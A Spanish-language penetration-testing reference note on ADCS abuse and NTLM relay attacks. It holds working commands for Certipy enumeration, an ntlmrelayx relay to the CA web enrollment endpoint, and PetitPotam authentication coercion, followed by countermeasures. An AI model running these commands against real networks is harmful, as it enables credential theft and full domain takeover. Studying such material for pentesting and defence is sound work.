# Abuso de ADCS y Ataques de Relay

## Descripción
Los Active Directory Certificate Services (ADCS) proporcionan la infraestructura de clave pública (PKI) nativa para entornos Windows. Los ataques de relay contra ADCS aprovechan protocolos de autenticación antiguos (NTLM) para redirigir credenciales robadas hacia interfaces HTTP de ADCS (como la inscripción web). Esto permite a un atacante obtener certificados de usuario o computadora sin conocer su contraseña, lo que a menudo resulta en la toma total del dominio si se obtienen certificados de administradores o controladores de dominio.

## Clasificación
- **Fase**: Explotación
- **MITRE ATT&CK**: T1557.001 (Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay); T1187 (Forced Authentication)
- **Plataforma**: Red
- **Dificultad**: Avanzada

## Herramientas
- **Certipy** — herramienta integral para enumerar y explotar vulnerabilidades en ADCS (ESC1-ESC13).
- **PetitPotam** — herramienta para forzar la autenticación NTLM desde un controlador de dominio hacia el atacante.
- **ntlmrelayx.py** (`impacket`) — servidor de relay que redirige credenciales NTLM hacia el endpoint de ADCS.
- **Coercer** — herramienta automatizada para forzar autenticaciones en AD mediante diversos protocolos (MS-EFSR, MS-RPRN).

## Comandos / Ejemplos

### Escaneo de vulnerabilidades ADCS con Certipy
```bash
# Encontrar plantillas de certificados vulnerables (misconfigurations)
certipy find -u user@corp.local -p Password123 -dc-ip 10.10.10.10 -vulnerable
```

### Configuración del servidor de Relay
```bash
# Escuchar peticiones NTLM y redirigirlas a la entidad certificadora (CA)
impacket-ntlmrelayx -t http://10.10.10.20/certsrv/certfnsh.asp -smb2support --adcs --template Machine
```

### Coacción de autenticación con PetitPotam
```bash
# Forzar al controlador de dominio a autenticarse contra el servidor del atacante
python3 PetitPotam.py 10.10.10.15 10.10.10.10
# 10.10.10.15: IP del atacante (escuchando con ntlmrelayx)
# 10.10.10.10: IP del controlador de dominio objetivo
```

## Contramedidas
- Deshabilitar el acceso HTTP a los servicios de inscripción de certificados si no son necesarios.
- Habilitar el Extended Protection for Authentication (EPA) en los servicios web de ADCS.
- Deshabilitar NTLM en favor de Kerberos siempre que sea posible.
- Restringir los permisos de las plantillas de certificados (evitar `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).

## Referencias
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- MITRE Corporation. (2024). ATT&CK Technique T1557.001: Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay. https://attack.mitre.org/techniques/T1557/001/
- Notas del proyecto: notas-md/AGENTS.md
